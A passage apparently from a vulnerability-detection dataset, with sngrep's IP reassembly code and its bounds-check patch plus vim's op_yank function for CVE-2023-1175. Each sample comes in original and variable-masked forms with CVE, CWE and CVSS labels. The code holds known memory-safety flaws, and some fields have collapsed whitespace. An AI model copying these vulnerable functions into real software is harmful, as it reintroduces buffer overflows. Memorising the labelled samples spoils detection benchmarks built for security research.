                if (ip_proto == IPPROTO_FRAGMENT) {
                    ip_frag = 1;
                    ip6f = (struct ip6_frag *) (packet + link_hl + ip_hl);
                    ip_frag_off = ntohs(ip6f->ip6f_offlg & IP6F_OFF_MASK);
                    ip_id = ntohl(ip6f->ip6f_ident);
                }

                inet_ntop(AF_INET6, &ip6->ip6_src, src.ip, sizeof(src.ip));
                inet_ntop(AF_INET6, &ip6->ip6_dst, dst.ip, sizeof(dst.ip));
                break;
#endif
            default:
                return NULL;
        }

        // Fixup VSS trailer in ethernet packets
        *caplen = link_hl + ip_len;

        // Remove IP Header length from payload
        *size = *caplen - link_hl - ip_hl;

        if (ip_proto == IPPROTO_IPIP) {
            // The payload is an incapsulated IP packet (IP-IP tunnel)
            // so we simply skip the ""outer"" IP header and repeat.
            // NOTE: this will break IP reassembly if the ""outer""
            // packet is fragmented.
            link_hl += ip_hl;
        } else {
            break;
        }
    }

    // Check maximum capture len
    if (*caplen > MAX_CAPTURE_LEN)
        return NULL;

    // If no fragmentation
    if (ip_frag == 0) {
        // Just create a new packet with given network data
        pkt = packet_create(ip_ver, ip_proto, src, dst, ip_id);
        packet_add_frame(pkt, header, packet);
        return pkt;
    }

    // Look for another packet with same id in IP reassembly vector
    it = vector_iterator(capinfo->ip_reasm);
    while ((pkt = vector_iterator_next(&it))) {
        if (addressport_equals(pkt->src, src)
                && addressport_equals(pkt->dst, dst)
                && pkt->ip_id == ip_id) {
            break;
        }
    }

    // If we already have this packet stored, append this frames to existing one
    if (pkt) {
        packet_add_frame(pkt, header, packet);
    } else {
        // Add To the possible reassembly list
        pkt = packet_create(ip_ver, ip_proto, src, dst, ip_id);
        packet_add_frame(pkt, header, packet);
        vector_append(capinfo->ip_reasm, pkt);
    }

    // Add this IP content length to the total captured of the packet
    pkt->ip_cap_len += ip_len - ip_hl;
#ifdef USE_IPV6
    if (ip_ver == 6 && ip_frag) {
        pkt->ip_cap_len -= sizeof(struct ip6_frag);
    }
#endif

    // Calculate how much data we need to complete this packet
    // The total packet size can only be known using the last fragment of the packet
    // where 'No more fragments is enabled' and it's calculated based on the
    // last fragment offset
    if (ip_ver == 4 && (ip_off & IP_MF) == 0) {
        pkt->ip_exp_len = ip_frag_off + ip_len - ip_hl;
    }
#ifdef USE_IPV6
    if (ip_ver == 6 && ip_frag && (ip6f->ip6f_offlg & htons(0x01)) == 0) {
        pkt->ip_exp_len = ip_frag_off + ip_len - ip_hl - sizeof(struct ip6_frag);
    }
#endif


    // If we have the whole packet (captured length is expected length)
    if (pkt->ip_cap_len == pkt->ip_exp_len) {
        // TODO Dont check the flag, check the holes
        // Calculate assembled IP payload data
        it = vector_iterator(pkt->frames);
        while ((frame = vector_iterator_next(&it))) {
            switch (ip_ver) {
                case 4: {
                    struct ip *frame_ip = (struct ip *) (frame->data + link_hl);
                    len_data += ntohs(frame_ip->ip_len) - frame_ip->ip_hl * 4;
                    break;
                }
#ifdef USE_IPV6
                case 6: {
                    struct ip6_hdr *frame_ip6 = (struct ip6_hdr *) (frame->data + link_hl);
                    len_data += ntohs(frame_ip6->ip6_ctlun.ip6_un1.ip6_un1_plen);
                    break;
                }
#endif
                default:
                    break;
            }
        }

        // Check packet content length
        if (len_data > MAX_CAPTURE_LEN)
            return NULL;

        // Initialize memory for the assembly packet
        memset(packet, 0, link_hl + ip_hl + len_data);

        it = vector_iterator(pkt->frames);
        while ((frame = vector_iterator_next(&it))) {
            switch (ip_ver) {
                case 4: {
                    // Get IP header
                    struct ip *frame_ip = (struct ip *) (frame->data + link_hl);
                    memcpy(packet + link_hl + ip_hl + (ntohs(frame_ip->ip_off) & IP_OFFMASK) * 8,
                           frame->data + link_hl + frame_ip->ip_hl * 4,
                           ntohs(frame_ip->ip_len) - frame_ip->ip_hl * 4);

                }
                    break;
#ifdef USE_IPV6
                case 6: {
                    struct ip6_hdr *frame_ip6 = (struct ip6_hdr*)(frame->data + link_hl);
                    struct ip6_frag *frame_ip6f = (struct ip6_frag *)(frame->data + link_hl + ip_hl);
                    uint16_t frame_ip_frag_off = ntohs(frame_ip6f->ip6f_offlg & IP6F_OFF_MASK);
                    memcpy(packet + link_hl + ip_hl + sizeof(struct ip6_frag) + frame_ip_frag_off,
                            frame->data + link_hl + ip_hl + sizeof (struct ip6_frag),
                            ntohs(frame_ip6->ip6_ctlun.ip6_un1.ip6_un1_plen));
                    pkt->proto = frame_ip6f->ip6f_nxt;
                }
                    break;
#endif
                default:
                    break;
            }
        }

        *caplen = link_hl + ip_hl + len_data;
#ifdef USE_IPV6
        if (ip_ver == 6) {
            *caplen += sizeof(struct ip6_frag);
        }
#endif
        *size = len_data;

        // Return the assembled IP packet
        vector_remove(capinfo->ip_reasm, pkt);
        return pkt;
    }

    return NULL;
}","packet_t *
capture_packet_reasm_ip(capture_info_t *VAR_0, const struct pcap_pkthdr *VAR_1, u_char *VAR_2, uint32_t *VAR_3, uint32_t *VAR_4)
{
    /* COMMENT_0 */
    struct ip *VAR_5;
#ifdef VAR_6
    /* COMMENT_1 */
    struct ip6_hdr *VAR_7;
#endif
    /* COMMENT_2 */
    uint32_t VAR_8;
    /* COMMENT_3 */
    uint8_t VAR_9;
    /* COMMENT_4 */
    uint32_t VAR_10 = 0;
    /* COMMENT_5 */
    uint16_t VAR_11 = 0;
    /* COMMENT_6 */
    uint16_t VAR_12 = 0;
    /* COMMENT_7 */
    uint16_t VAR_13 = 0;
    /* COMMENT_8 */
    uint32_t VAR_14 = 0;
    /* COMMENT_9 */
    uint16_t VAR_15 = 0;
    /* COMMENT_10 */
    address_t VAR_16 = { };
    /* COMMENT_11 */
    address_t VAR_17 = { };
    /* COMMENT_12 */
    vector_iter_t VAR_18;
    /* COMMENT_13 */
    packet_t *VAR_19;
    /* COMMENT_14 */
    frame_t *VAR_20;
    uint32_t VAR_21 = 0;
    /* COMMENT_15 */
    uint16_t VAR_22 = VAR_0->link_hl;
#ifdef VAR_6
    struct ip6_frag *VAR_23;
#endif

    /* COMMENT_16 */
    if (VAR_0->link == VAR_24) {
        struct ether_header *VAR_25 = (struct ether_header *) VAR_2;
        if (ntohs(VAR_25->ether_type) == VAR_26) {
            VAR_22 += 4;
        }
    }

#ifdef VAR_27
    if (VAR_0->link == VAR_28) {
        struct sll_header *VAR_29 = (struct sll_header *) VAR_2;
        if (ntohs(VAR_29->sll_protocol) == VAR_26) {
            VAR_22 += 4;
        }
    }
#endif

    /* COMMENT_17 */
    if (VAR_0->link == VAR_30) {
        /* COMMENT_18 */
        while (VAR_22 + 8 <= *VAR_4) {
            nflog_tlv_t *VAR_31 = (nflog_tlv_t *) (VAR_2 + VAR_22);

            if (!VAR_31) break;

            if (VAR_31->tlv_type == VAR_32) {
                VAR_22 += 4;
                break;
            }

            if (VAR_31->tlv_length >= 4) {
                VAR_22 += ((VAR_31->tlv_length + 3) & ~3); /* COMMENT_19 */
            }
        }
    }

    while (*VAR_3 >= sizeof(struct ip)) {
        /* COMMENT_20 */
        VAR_5 = (struct ip *) (VAR_2 + VAR_22);

#ifdef VAR_6
        /* COMMENT_21 */
        VAR_7 = (struct ip6_hdr *) (VAR_2 + VAR_22);
#endif

        /* COMMENT_22 */
        VAR_8 = VAR_5->ip_v;

        switch (VAR_8) {
            case 4:
                VAR_10 = VAR_5->ip_hl * 4;
                VAR_9 = VAR_5->ip_p;
                VAR_11 = ntohs(VAR_5->ip_off);
                VAR_12 = ntohs(VAR_5->ip_len);

                VAR_13 = VAR_11 & (VAR_33 | VAR_34);
                VAR_15 = (VAR_13) ? (VAR_11 & VAR_34) * 8 : 0;
                VAR_14 = ntohs(VAR_5->ip_id);

                inet_ntop(VAR_35, &VAR_5->ip_src, VAR_16.ip, sizeof(VAR_16.ip));
                inet_ntop(VAR_35, &VAR_5->ip_dst, VAR_17.ip, sizeof(VAR_17.ip));
                break;
#ifdef VAR_6
            case 6:
                VAR_10 = sizeof(struct ip6_hdr);
                VAR_9 = VAR_7->ip6_nxt;
                VAR_12 = ntohs(VAR_7->ip6_ctlun.ip6_un1.ip6_un1_plen) + VAR_10;

                if (VAR_9 == VAR_36) {
                    VAR_13 = 1;
                    VAR_23 = (struct ip6_frag *) (VAR_2 + VAR_22 + VAR_10);
                    VAR_15 = ntohs(VAR_23->ip6f_offlg & VAR_37);
                    VAR_14 = ntohl(VAR_23->ip6f_ident);
                }

                inet_ntop(VAR_38, &VAR_7->ip6_src, VAR_16.ip, sizeof(VAR_16.ip));
                inet_ntop(VAR_38, &VAR_7->ip6_dst, VAR_17.ip, sizeof(VAR_17.ip));
                break;
#endif
            default:
                return NULL;
        }

        /* COMMENT_23 */
        *VAR_4 = VAR_22 + VAR_12;

        /* COMMENT_24 */
        *VAR_3 = *VAR_4 - VAR_22 - VAR_10;

        if (VAR_9 == VAR_39) {
            /* COMMENT_25 */
            /* COMMENT_26 */
            /* COMMENT_27 */
            /* COMMENT_28 */
            VAR_22 += VAR_10;
        } else {
            break;
        }
    }

    /* COMMENT_29 */
    if (*VAR_4 > VAR_40)
        return NULL;

    /* COMMENT_30 */
    if (VAR_13 == 0) {
        /* COMMENT_31 */
        VAR_19 = packet_create(VAR_8, VAR_9, VAR_16, VAR_17, VAR_14);
        packet_add_frame(VAR_19, VAR_1, VAR_2);
        return VAR_19;
    }

    /* COMMENT_32 */
    VAR_18 = vector_iterator(VAR_0->ip_reasm);
    while ((VAR_19 = vector_iterator_next(&VAR_18))) {
        if (addressport_equals(VAR_19->src, VAR_16)
                && addressport_equals(VAR_19->dst, VAR_17)
                && VAR_19->ip_id == VAR_14) {
            break;
        }
    }

    /* COMMENT_33 */
    if (VAR_19) {
        packet_add_frame(VAR_19, VAR_1, VAR_2);
    } else {
        /* COMMENT_34 */
        VAR_19 = packet_create(VAR_8, VAR_9, VAR_16, VAR_17, VAR_14);
        packet_add_frame(VAR_19, VAR_1, VAR_2);
        vector_append(VAR_0->ip_reasm, VAR_19);
    }

    /* COMMENT_35 */
    VAR_19->ip_cap_len += VAR_12 - VAR_10;
#ifdef VAR_6
    if (VAR_8 == 6 && VAR_13) {
        VAR_19->ip_cap_len -= sizeof(struct ip6_frag);
    }
#endif

    /* COMMENT_36 */
    /* COMMENT_37 */
    /* COMMENT_38 */
    /* COMMENT_39 */
    if (VAR_8 == 4 && (VAR_11 & VAR_33) == 0) {
        VAR_19->ip_exp_len = VAR_15 + VAR_12 - VAR_10;
    }
#ifdef VAR_6
    if (VAR_8 == 6 && VAR_13 && (VAR_23->ip6f_offlg & htons(0x01)) == 0) {
        VAR_19->ip_exp_len = VAR_15 + VAR_12 - VAR_10 - sizeof(struct ip6_frag);
    }
#endif


    /* COMMENT_40 */
    if (VAR_19->ip_cap_len == VAR_19->ip_exp_len) {
        /* COMMENT_41 */
        /* COMMENT_42 */
        VAR_18 = vector_iterator(VAR_19->frames);
        while ((VAR_20 = vector_iterator_next(&VAR_18))) {
            switch (VAR_8) {
                case 4: {
                    struct ip *VAR_41 = (struct ip *) (VAR_20->data + VAR_22);
                    VAR_21 += ntohs(VAR_41->ip_len) - VAR_41->ip_hl * 4;
                    break;
                }
#ifdef VAR_6
                case 6: {
                    struct ip6_hdr *VAR_42 = (struct ip6_hdr *) (VAR_20->data + VAR_22);
                    VAR_21 += ntohs(VAR_42->ip6_ctlun.ip6_un1.ip6_un1_plen);
                    break;
                }
#endif
                default:
                    break;
            }
        }

        /* COMMENT_43 */
        if (VAR_21 > VAR_40)
            return NULL;

        /* COMMENT_44 */
        memset(VAR_2, 0, VAR_22 + VAR_10 + VAR_21);

        VAR_18 = vector_iterator(VAR_19->frames);
        while ((VAR_20 = vector_iterator_next(&VAR_18))) {
            switch (VAR_8) {
                case 4: {
                    /* COMMENT_20 */
                    struct ip *VAR_41 = (struct ip *) (VAR_20->data + VAR_22);
                    memcpy(VAR_2 + VAR_22 + VAR_10 + (ntohs(VAR_41->ip_off) & VAR_34) * 8,
                           VAR_20->data + VAR_22 + VAR_41->ip_hl * 4,
                           ntohs(VAR_41->ip_len) - VAR_41->ip_hl * 4);

                }
                    break;
#ifdef VAR_6
                case 6: {
                    struct ip6_hdr *VAR_42 = (struct ip6_hdr*)(VAR_20->data + VAR_22);
                    struct ip6_frag *VAR_43 = (struct ip6_frag *)(VAR_20->data + VAR_22 + VAR_10);
                    uint16_t VAR_44 = ntohs(VAR_43->ip6f_offlg & VAR_37);
                    memcpy(VAR_2 + VAR_22 + VAR_10 + sizeof(struct ip6_frag) + VAR_44,
                            VAR_20->data + VAR_22 + VAR_10 + sizeof (struct ip6_frag),
                            ntohs(VAR_42->ip6_ctlun.ip6_un1.ip6_un1_plen));
                    VAR_19->proto = VAR_43->ip6f_nxt;
                }
                    break;
#endif
                default:
                    break;
            }
        }

        *VAR_4 = VAR_22 + VAR_10 + VAR_21;
#ifdef VAR_6
        if (VAR_8 == 6) {
            *VAR_4 += sizeof(struct ip6_frag);
        }
#endif
        *VAR_3 = VAR_21;

        /* COMMENT_45 */
        vector_remove(VAR_0->ip_reasm, VAR_19);
        return VAR_19;
    }

    return NULL;
}",irontec/sngrep/038a65883551fdccc0bb86600309bb85d2251f98/capture.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -140,6 +140,10 @@
         }
     }
 
+    // Check maximum capture len
+    if (*caplen > MAX_CAPTURE_LEN)
+        return NULL;
+
     // If no fragmentation
     if (ip_frag == 0) {
         // Just create a new packet with given network data","{'deleted_lines': [], 'added_lines': ['    // Check maximum capture len', '    if (*caplen > MAX_CAPTURE_LEN)', '        return NULL;', '']}",True,Sngrep v1.6.0 was discovered to contain a stack buffer overflow via the function packet_set_payload at /src/packet.c.,7.8,HIGH,2,valid,2023-03-01T11:55:10Z,4
CVE-2023-1175,['CWE-131'],CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:H,1,vim,"patch 9.0.1378: illegal memory access when using virtual editing

Problem:    Illegal memory access when using virtual editing.
Solution:   Make sure ""startspaces"" is not negative.",c99cbf8f289bdda5d4a77d7ec415850a520330ba,https://github.com/vim/vim/commit/c99cbf8f289bdda5d4a77d7ec415850a520330ba,src/register.c,op_yank,"int
op_yank(oparg_T *oap, int deleting, int mess)
{
longy_idx;    yankreg_T*curr;    yankreg_Tnewreg;    char_u**new_ptr;
linenr_Tlnum;    longj;
intyanktype = oap->motion_type;
longyanklines = oap->line_count;
linenr_Tyankendlnum = oap->end.lnum;
char_u*p;
char_u*pnew;
struct block_defbd;
#if defined(FEAT_CLIPBOARD) && defined(FEAT_X11)
intdid_star = FALSE;
#endif
if (oap->regname != 0 && !valid_yank_reg(oap->regname, TRUE))
{
beep_flush();
return FAIL;
}
if (oap->regname == '_')    return OK;
#ifdef FEAT_CLIPBOARD
if (!clip_star.available && oap->regname == '*')
oap->regname = 0;
else if (!clip_plus.available && oap->regname == '+')
oap->regname = 0;
#endif
if (!deleting)    get_yank_register(oap->regname, TRUE);
curr = y_current;
if (y_append && y_current->y_array != NULL)
y_current = &newreg;
else
free_yank_all();    
if (       oap->motion_type == MCHAR
&& oap->start.col == 0
&& !oap->inclusive
&& (!oap->is_VIsual || *p_sel == 'o')
&& !oap->block_mode
&& oap->end.col == 0
&& yanklines > 1)
{
yanktype = MLINE;
--yankendlnum;
--yanklines;
}
y_current->y_size = yanklines;
y_current->y_type = yanktype;       y_current->y_width = 0;
y_current->y_array = lalloc_clear(sizeof(char_u *) * yanklines, TRUE);
if (y_current->y_array == NULL)
{
y_current = curr;
return FAIL;
}
#ifdef FEAT_VIMINFO
y_current->y_time_set = vim_time();
#endif
y_idx = 0;
lnum = oap->start.lnum;
if (oap->block_mode)
{
y_current->y_type = MBLOCK;    y_current->y_width = oap->end_vcol - oap->start_vcol;
if (curwin->w_curswant == MAXCOL && y_current->y_width > 0)
y_current->y_width--;
}
for ( ; lnum <= yankendlnum; lnum++, y_idx++)
{
switch (y_current->y_type)
{
case MBLOCK:
block_prep(oap, &bd, lnum, FALSE);
if (yank_copy_line(&bd, y_idx, oap->excl_tr_ws) == FAIL)
goto fail;
break;
case MLINE:
if ((y_current->y_array[y_idx] =
vim_strsave(ml_get(lnum))) == NULL)
goto fail;
break;
case MCHAR:
{
colnr_T startcol = 0, endcol = MAXCOL;
int    is_oneChar = FALSE;
colnr_T cs, ce;
p = ml_get(lnum);
bd.startspaces = 0;
bd.endspaces = 0;
if (lnum == oap->start.lnum)
{
startcol = oap->start.col;
if (virtual_op)
{
getvcol(curwin, &oap->start, &cs, NULL, &ce);
if (ce != cs && oap->start.coladd > 0)
{
bd.startspaces = (ce - cs + 1)
- oap->start.coladd;
startcol++;
}
}
}
if (lnum == oap->end.lnum)
{
endcol = oap->end.col;
if (virtual_op)
{
getvcol(curwin, &oap->end, &cs, NULL, &ce);
if (p[endcol] == NUL || (cs + oap->end.coladd < ce
&& (*mb_head_off)(p, p + endcol) == 0))
{
if (oap->start.lnum == oap->end.lnum
&& oap->start.col == oap->end.col)
{
is_oneChar = TRUE;
bd.startspaces = oap->end.coladd
- oap->start.coladd + oap->inclusive;
endcol = startcol;
}
else
{
bd.endspaces = oap->end.coladd
+ oap->inclusive;
endcol -= oap->inclusive;
}
}
}
}
if (endcol == MAXCOL)
endcol = (colnr_T)STRLEN(p);
if (startcol > endcol || is_oneChar)
bd.textlen = 0;
else
bd.textlen = endcol - startcol + oap->inclusive;
bd.textstart = p + startcol;
if (yank_copy_line(&bd, y_idx, FALSE) == FAIL)
goto fail;
break;
}
}
}
if (curr != y_current)    {
new_ptr = ALLOC_MULT(char_u *, curr->y_size + y_current->y_size);
if (new_ptr == NULL)
goto fail;
for (j = 0; j < curr->y_size; ++j)
new_ptr[j] = curr->y_array[j];
vim_free(curr->y_array);
curr->y_array = new_ptr;
#ifdef FEAT_VIMINFO
curr->y_time_set = vim_time();
#endif
if (yanktype == MLINE)    curr->y_type = MLINE;
if (curr->y_type == MCHAR && vim_strchr(p_cpo, CPO_REGAPPEND) == NULL)
{
pnew = alloc(STRLEN(curr->y_array[curr->y_size - 1])
+ STRLEN(y_current->y_array[0]) + 1);
if (pnew == NULL)
{
y_idx = y_current->y_size - 1;
goto fail;
}
STRCPY(pnew, curr->y_array[--j]);
STRCAT(pnew, y_current->y_array[0]);
vim_free(curr->y_array[j]);
vim_free(y_current->y_array[0]);
curr->y_array[j++] = pnew;
y_idx = 1;
}
else
y_idx = 0;
while (y_idx < y_current->y_size)
curr->y_array[j++] = y_current->y_array[y_idx++];
curr->y_size = j;
vim_free(y_current->y_array);
y_current = curr;
}
if (mess)    {
if (yanktype == MCHAR
&& !oap->block_mode
&& yanklines == 1)
yanklines = 0;
if (yanklines > p_report)
{
char namebuf[100];
if (oap->regname == NUL)
*namebuf = NUL;
else
vim_snprintf(namebuf, sizeof(namebuf),
_("" into \""%c""), oap->regname);
update_topline_redraw();
if (oap->block_mode)
{
smsg(NGETTEXT(""block of %ld line yanked%s"",
""block of %ld lines yanked%s"", yanklines),
yanklines, namebuf);
}
else
{
smsg(NGETTEXT(""%ld line yanked%s"",
""%ld lines yanked%s"", yanklines),
yanklines, namebuf);
}
}
}
if ((cmdmod.cmod_flags & CMOD_LOCKMARKS) == 0)
{
curbuf->b_op_start = oap->start;
curbuf->b_op_end = oap->end;
if (yanktype == MLINE && !oap->block_mode)
{
curbuf->b_op_start.col = 0;
curbuf->b_op_end.col = MAXCOL;
}
}
#ifdef FEAT_CLIPBOARD
if (clip_star.available
&& (curr == &(y_regs[STAR_REGISTER])
|| (!deleting && oap->regname == 0
&& ((clip_unnamed | clip_unnamed_saved) & CLIP_UNNAMED))))
{
if (curr != &(y_regs[STAR_REGISTER]))
copy_yank_reg(&(y_regs[STAR_REGISTER]));
clip_own_selection(&clip_star);
clip_gen_set_selection(&clip_star);
# ifdef FEAT_X11
did_star = TRUE;
# endif
}
# ifdef FEAT_X11
if (clip_plus.available
&& (curr == &(y_regs[PLUS_REGISTER])
|| (!deleting && oap->regname == 0
&& ((clip_unnamed | clip_unnamed_saved) &
CLIP_UNNAMED_PLUS))))
{
if (curr != &(y_regs[PLUS_REGISTER]))
copy_yank_reg(&(y_regs[PLUS_REGISTER]));
clip_own_selection(&clip_plus);
clip_gen_set_selection(&clip_plus);
if (!clip_isautosel_star()
&& !clip_isautosel_plus()
&& !((clip_unnamed | clip_unnamed_saved) == CLIP_UNNAMED_PLUS)
&& !(deleting && (clip_unnamed | clip_unnamed_saved)
== (CLIP_UNNAMED | CLIP_UNNAMED_PLUS))
&& !did_star
&& curr == &(y_regs[PLUS_REGISTER]))
{
copy_yank_reg(&(y_regs[STAR_REGISTER]));
clip_own_selection(&clip_star);
clip_gen_set_selection(&clip_star);
}
}
# endif
#endif
#if defined(FEAT_EVAL)
if (!deleting && has_textyankpost())
yank_do_autocmd(oap, y_current);
#endif
return OK;
fail:    free_yank(y_idx + 1);
y_current = curr;
return FAIL;
}","int
op_yank(oparg_T *VAR_0, int VAR_1, int VAR_2)
{
longVAR_3;
yankreg_T*VAR_4;
yankreg_TVAR_5;
char_u**VAR_6;
linenr_TVAR_7;
longVAR_8;
intVAR_9 = VAR_0->motion_type;
longVAR_10 = VAR_0->line_count;
linenr_TVAR_11 = VAR_0->end.lnum;
char_u*VAR_12;
char_u*VAR_13;
struct block_defVAR_14;
#if defined(VAR_15) && defined(VAR_16)
intVAR_17 = FALSE;
#endif
if (VAR_0->regname != 0 && !valid_yank_reg(VAR_0->regname, TRUE))
{
beep_flush();
return VAR_18;
}
if (VAR_0->regname == '_')    
return VAR_19;
#ifdef VAR_15
if (!VAR_20.available && VAR_0->regname == '*')
VAR_0->regname = 0;
else if (!VAR_21.available && VAR_0->regname == '+')
VAR_0->regname = 0;
#endif
if (!VAR_1)    
get_yank_register(VAR_0->regname, TRUE);
VAR_4 = VAR_22;
if (VAR_23 && VAR_22->y_array != NULL)
VAR_22 = &VAR_5;
else
free_yank_all();    
if (       VAR_0->motion_type == VAR_24
&& VAR_0->start.col == 0
&& !VAR_0->inclusive
&& (!VAR_0->is_VIsual || *VAR_25 == 'o')
&& !VAR_0->block_mode
&& VAR_0->end.col == 0
&& VAR_10 > 1)
{
VAR_9 = VAR_26;
--VAR_11;
--VAR_10;
}
VAR_22->y_size = VAR_10;
VAR_22->y_type = VAR_9;   
VAR_22->y_width = 0;
VAR_22->y_array = lalloc_clear(sizeof(char_u *) * VAR_10, TRUE);
if (VAR_22->y_array == NULL)
{
VAR_22 = VAR_4;
return VAR_18;
}
#ifdef VAR_27
VAR_22->y_time_set = vim_time();
#endif
VAR_3 = 0;
VAR_7 = VAR_0->start.lnum;
if (VAR_0->block_mode)
{
VAR_22->y_type = VAR_28;    
VAR_22->y_width = VAR_0->end_vcol - VAR_0->start_vcol;
if (VAR_29->w_curswant == VAR_30 && VAR_22->y_width > 0)
VAR_22->y_width--;
}
for ( ; VAR_7 <= VAR_11; VAR_7++, VAR_3++)
{
switch (VAR_22->y_type)
{
case VAR_28:
block_prep(VAR_0, &VAR_14, VAR_7, FALSE);
if (yank_copy_line(&VAR_14, VAR_3, VAR_0->excl_tr_ws) == VAR_18)
goto fail;
break;
case VAR_26:
if ((VAR_22->y_array[VAR_3] =
vim_strsave(ml_get(VAR_7))) == NULL)
goto fail;
break;
case VAR_24:
{
colnr_T VAR_31 = 0, VAR_32 = VAR_30;
int    VAR_33 = FALSE;
colnr_T VAR_34, VAR_35;
VAR_12 = ml_get(VAR_7);
VAR_14.startspaces = 0;
VAR_14.endspaces = 0;
if (VAR_7 == VAR_0->start.lnum)
{
VAR_31 = VAR_0->start.col;
if (VAR_36)
{
getvcol(VAR_29, &VAR_0->start, &VAR_34, NULL, &VAR_35);
if (VAR_35 != VAR_34 && VAR_0->start.coladd > 0)
{
VAR_14.startspaces = (VAR_35 - VAR_34 + 1)
- VAR_0->start.coladd;
VAR_31++;
}
}
}
if (VAR_7 == VAR_0->end.lnum)
{
VAR_32 = VAR_0->end.col;
if (VAR_36)
{
getvcol(VAR_29, &VAR_0->end, &VAR_34, NULL, &VAR_35);
if (VAR_12[VAR_32] == VAR_37 || (VAR_34 + VAR_0->end.coladd < VAR_35
&& (*VAR_38)(VAR_12, VAR_12 + VAR_32) == 0))
{
if (VAR_0->start.lnum == VAR_0->end.lnum
&& VAR_0->start.col == VAR_0->end.col)
{
VAR_33 = TRUE;
VAR_14.startspaces = VAR_0->end.coladd
- VAR_0->start.coladd + VAR_0->inclusive;
VAR_32 = VAR_31;
}
else
{
VAR_14.endspaces = VAR_0->end.coladd
+ VAR_0->inclusive;
VAR_32 -= VAR_0->inclusive;
}
}
}
}
if (VAR_32 == VAR_30)
VAR_32 = (colnr_T)STRLEN(VAR_12);
if (VAR_31 > VAR_32 || VAR_33)
VAR_14.textlen = 0;
else
VAR_14.textlen = VAR_32 - VAR_31 + VAR_0->inclusive;
VAR_14.textstart = VAR_12 + VAR_31;
if (yank_copy_line(&VAR_14, VAR_3, FALSE) == VAR_18)
goto fail;
break;
}
}
}
if (VAR_4 != VAR_22)
{
VAR_6 = ALLOC_MULT(char_u *, VAR_4->y_size + VAR_22->y_size);
if (VAR_6 == NULL)
goto fail;
for (VAR_8 = 0; VAR_8 < VAR_4->y_size; ++VAR_8)
VAR_6[VAR_8] = VAR_4->y_array[VAR_8];
vim_free(VAR_4->y_array);
VAR_4->y_array = VAR_6;
#ifdef VAR_27
VAR_4->y_time_set = vim_time();
#endif
if (VAR_9 == VAR_26)
VAR_4->y_type = VAR_26;
if (VAR_4->y_type == VAR_24 && vim_strchr(VAR_39, VAR_40) == NULL)
{
VAR_13 = alloc(STRLEN(VAR_4->y_array[VAR_4->y_size - 1])
+ STRLEN(VAR_22->y_array[0]) + 1);
if (VAR_13 == NULL)
{
VAR_3 = VAR_22->y_size - 1;
goto fail;
}
STRCPY(VAR_13, VAR_4->y_array[--VAR_8]);
STRCAT(VAR_13, VAR_22->y_array[0]);
vim_free(VAR_4->y_array[VAR_8]);
vim_free(VAR_22->y_array[0]);
VAR_4->y_array[VAR_8++] = VAR_13;
VAR_3 = 1;
}
else
VAR_3 = 0;
while (VAR_3 < VAR_22->y_size)
VAR_4->y_array[VAR_8++] = VAR_22->y_array[VAR_3++];
VAR_4->y_size = VAR_8;
vim_free(VAR_22->y_array);
VAR_22 = VAR_4;
}
if (VAR_2)
{
if (VAR_9 == VAR_24
&& !VAR_0->block_mode
&& VAR_10 == 1)
VAR_10 = 0;
if (VAR_10 > VAR_41)
{
char VAR_42[100];
if (VAR_0->regname == VAR_37)
*VAR_42 = VAR_37;
else
vim_snprintf(VAR_42, sizeof(VAR_42),
_("" into \""%c""), VAR_0->regname);
update_topline_redraw();
if (VAR_0->block_mode)
{
smsg(NGETTEXT(""block of %ld line yanked%s"",
""block of %ld lines yanked%s"", VAR_10),
VAR_10, VAR_42);
}
else
{
smsg(NGETTEXT(""%ld line yanked%s"",
""%ld lines yanked%s"", VAR_10),
VAR_10, VAR_42);
}
}
}
if ((VAR_43.cmod_flags & VAR_44) == 0)
{
VAR_45->b_op_start = VAR_0->start;
VAR_45->b_op_end = VAR_0->end;
if (VAR_9 == VAR_26 && !VAR_0->block_mode)
{
VAR_45->b_op_start.col = 0;
VAR_45->b_op_end.col = VAR_30;
}
}
#ifdef VAR_15
if (VAR_20.available
&& (VAR_4 == &(VAR_46[VAR_47])
|| (!VAR_1 && VAR_0->regname == 0
&& ((VAR_48 | VAR_49) & VAR_50))))
{
if (VAR_4 != &(VAR_46[VAR_47]))
copy_yank_reg(&(VAR_46[VAR_47]));
clip_own_selection(&VAR_20);
clip_gen_set_selection(&VAR_20);
# ifdef VAR_16
VAR_17 = TRUE;
# endif
}
# ifdef VAR_16
if (VAR_21.available
&& (VAR_4 == &(VAR_46[VAR_51])
|| (!VAR_1 && VAR_0->regname == 0
&& ((VAR_48 | VAR_49) &
VAR_52))))
{
if (VAR_4 != &(VAR_46[VAR_51]))
copy_yank_reg(&(VAR_46[VAR_51]));
clip_own_selection(&VAR_21);
clip_gen_set_selection(&VAR_21);
if (!clip_isautosel_star()
&& !clip_isautosel_plus()
&& !((VAR_48 | VAR_49) == VAR_52)
&& !(VAR_1 && (VAR_48 | VAR_49)
== (VAR_50 | VAR_52))
&& !VAR_17
&& VAR_4 == &(VAR_46[VAR_51]))
{
copy_yank_reg(&(VAR_46[VAR_47]));
clip_own_selection(&VAR_20);
clip_gen_set_selection(&VAR_20);
}
}
# endif
#endif
#if defined(VAR_53)
if (!VAR_1 && has_textyankpost())
yank_do_autocmd(VAR_0, VAR_22);
#endif
return VAR_19;
fail:
free_yank(VAR_3 + 1);
VAR_22 = VAR_4;
return VAR_18;
}",vim/c99cbf8f289bdda5d4a77d7ec415850a520330ba/register.c/vul/before/0.json,"int
op_yank(oparg_T *oap, int deleting, int mess)
{
    long		y_idx;		// index in y_array[]
    yankreg_T		*curr;		// copy of y_current
    yankreg_T		newreg;		// new yank register when appending
    char_u		**new_ptr;
    linenr_T		lnum;		// current line number
    long		j;
    int			yanktype = oap->motion_type;
    long		yanklines = oap->line_count;
    linenr_T		yankendlnum = oap->end.lnum;
    char_u		*p;
    char_u		*pnew;
    struct block_def	bd;
#if defined(FEAT_CLIPBOARD) && defined(FEAT_X11)
    int			did_star = FALSE;
#endif

				    // check for read-only register
    if (oap->regname != 0 && !valid_yank_reg(oap->regname, TRUE))
    {
	beep_flush();
	return FAIL;
    }
    if (oap->regname == '_')	    // black hole: nothing to do
	return OK;

#ifdef FEAT_CLIPBOARD
    if (!clip_star.available && oap->regname == '*')
	oap->regname = 0;
    else if (!clip_plus.available && oap->regname == '+')
	oap->regname = 0;
#endif

    if (!deleting)		    // op_delete() already set y_current
	get_yank_register(oap->regname, TRUE);

    curr = y_current;
				    // append to existing contents
    if (y_append && y_current->y_array != NULL)
